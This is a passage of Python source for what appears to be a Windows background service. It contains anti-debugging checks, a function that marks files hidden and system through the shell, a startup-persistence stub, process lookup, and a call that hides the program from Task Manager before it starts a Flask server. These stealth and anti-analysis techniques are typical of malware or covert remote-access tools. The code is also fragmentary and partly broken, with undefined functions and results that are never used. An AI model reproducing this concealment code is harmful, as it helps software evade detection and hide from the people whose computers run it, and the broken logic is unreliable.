    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool(True)))
    ctypes.windll.kernel32.IsDebuggerPresent()  # ডিবাগার থাকলে ক্র্যাশ
# --- Set Hidden + System Attributes ---
def hide_file(path):
    subprocess.call(f'attrib +h +s "{path}"', shell=True)

# --- Add to Startup ---

# --- Find Process ID ---
def find_pid(targets):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() in [t.lower() for t in targets]:
            return proc.info['pid']
    return None


if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(MyService)
    hide_from_task_manager()
    flask_thread = threading.Thread(target=run_flask)
    # svelte_thread.start()
    flask_thread.start()
    def on_exit():
        flask_thread.join()
        # svelte_thread.join()
    atexit.register(on_exit)
    run_flask()

